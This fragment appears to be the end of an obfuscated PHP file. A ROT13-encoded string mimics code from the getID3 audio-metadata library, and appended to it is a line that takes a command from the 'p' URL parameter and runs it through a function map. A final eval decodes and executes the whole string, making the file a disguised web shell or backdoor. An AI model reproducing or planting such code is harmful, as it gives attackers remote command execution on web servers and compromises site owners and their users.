		erghea (vffrg($YNZRcerfrgHfrqYbbxhc[$YNZRgnt['cerfrg_hfrq_vq']]) ? $YNZRcerfrgHfrqYbbxhc[$YNZRgnt['cerfrg_hfrq_vq']] : 'arj/haxabja cerfrg: '.$YNZRgnt['cerfrg_hfrq_vq'].' - ercbeg gb vasb@trgvq3.bet');
	}

}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>